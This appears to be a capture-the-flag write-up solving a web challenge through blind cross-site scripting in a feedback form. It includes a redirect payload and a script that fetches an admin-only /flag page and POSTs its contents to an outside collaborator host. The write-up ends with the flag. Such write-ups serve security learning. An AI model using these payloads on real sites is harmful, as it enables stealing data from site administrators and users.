We've made some new epic updates to our website. Could you send us some feedback on it ?

link - [bxxs](http://web.zh3r0.cf:3333)

## Solution
- The website contains a form which accepts feedback and sends it to the admin
- A quick check for blind XSS (clue from the challenge name?!) confirms the vulnerability

```
<script>
  location="//leet.burpcollaborator.net/";
</script>
```

- Attempts to read the admin cookie failed because of `httpOnly cookies`
- Another endpoint was guessed (ctfs, duh), `/flag`, however only the admin can view the contents
- The following payload can be used to obtain the flag

```
<script>
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
  if (this.readyState == 4) {
    var req = new XMLHttpRequest();
    req.open("POST", "http://leet.burpcollaborator.net/givemeflag?c="+window.location.href,true);
    req.send(xhttp.responseText);
  }
};
xhttp.open("GET", "http://0.0.0.0:8080/flag", true);
xhttp.send();
</script>
```

## Flag
```
zh3r0{{Ea5y_bx55_ri8}}
```
